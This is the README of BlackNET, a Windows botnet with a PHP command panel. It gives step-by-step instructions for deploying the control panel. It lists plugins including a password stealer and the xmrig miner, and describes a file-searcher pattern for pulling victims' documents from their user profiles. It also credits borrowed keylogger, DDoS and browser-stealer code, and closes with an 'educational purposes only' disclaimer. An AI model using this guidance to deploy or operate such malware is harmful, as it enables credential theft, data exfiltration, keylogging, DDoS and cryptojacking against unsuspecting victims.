<p align="center">
 <img src="https://e.top4top.io/p_1759cl1t61.png" alt="" />
</p>

<p align="center">
 <a href="#"><img align="center" src="https://img.shields.io/maintenance/no/2020" /></a>
 <a href="#"><img align="center" src="https://img.shields.io/github/license/FarisCode511/BlackNET" /></a>
 <a href="#"><img align="center" src="https://img.shields.io/github/languages/top/FarisCode511/BlackNET" /></a>
</p>

---

# BlackNET
Free advanced and modern Windows botnet with a nice and secure PHP panel developed using VB.NET.

#### WARNING: [ THIS PROJECT IS NOT MAINTAINED ANYMORE ]


## Requirements
1. PHP >=  7.3
2. NET Framework
    + Stub >= 4.5
    + Builder >= 4.5

## How to Install
1. Pull the repo or Download the latest release
2. Compress BlackNET panel folder and upload it to your hosting
3. Create a database with any name you want
4. Change the database information in config/config.php
5. Change the "Panel URL" with your url in config/config.php
6. Change all files and folders permission to 777
7. Make Sure that all dependencies are included in "plugins" folder
   + FileSearcher.dll
   + PasswordStealer.dll
   + PluginExample.dll
   + xmrig.exe
8. Go to install.php fill-up the form and click install
9. Create a cron job for ping.php and remove.php

## Update notice
If you have BlackNET installed you need

#### WARNING: BEFORE UPDATING PLEASE MAKE A COPY OF YOUR DATABASE OR YOU WILL LOSE YOUR CLIENTS

1. Make a copy of config.php
2. Upload the new files
3. Update the new config.php
4. Run update.php

## How to secure BlackNET
1. Remove install.php and update.php
2. Enable Captcha using Google reCaptcha v3
3. Enable 2FA on your account
4. Add a security question

## How to use the File Searcher Function
1. execute "Get file fom the system" command on the client
2. use this pattern ``` %Userprofile%|[Here write extension list] ```
3. Wait until the plugin finish the process and upload the files

Pattern Example:
```
%Userprofile%|[jpg,png,docx,pdf,logs,txt,pptx,psd,rtf]
```

## 000Webhost notice

Please use [Unzipper.php](https://github.com/ndeet/unzipper) to extract the panel files inside 000webhost filemanager

## Documentation

If you want to develope or reuse the panel you can take a look at the code document to understand some of the functions and how to use them

### [Documentation](https://blackhacker511.github.io/BlackNET/)


## YouTube Tutorials
[How to install BlackNET v3.7.0](https://youtu.be/0IU_64yfL80)

[How to update BlackNET](https://youtu.be/IaZ3ZA-83UU)

[How to Setup BlackNET Cron Job System](https://youtu.be/rHCYGRA1h54)

[How to Secure BlackNET Panel](https://youtu.be/P6dBDr9iCD8)

## Used Code
| Developer       | Used Code    | Used For      |
| :-------------: | :----------: | :-----------: |
| KFC Watermelon  | PlasmaRAT    | BlackNET DDoS |
| NYANxCAT        | LimeLogger   | Keylogger     |
| 0xfd            | Chrome Retriver| Chrome Stealer|
| LimerBoy        | JSONReader   | Firefox Stealer | 
| Amadeus         | XMR Miner    | XMR Miner       |

## Used Libraries
1. PHPMailer
2. Google reCaptcha
3. PHPSpreadsheet
4. Google Authenticator
5. GeoIP2

## LEGAL DISCLAIMER PLEASE READ!
##### I, the creator and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.

## License
This project is licensed under the MIT License
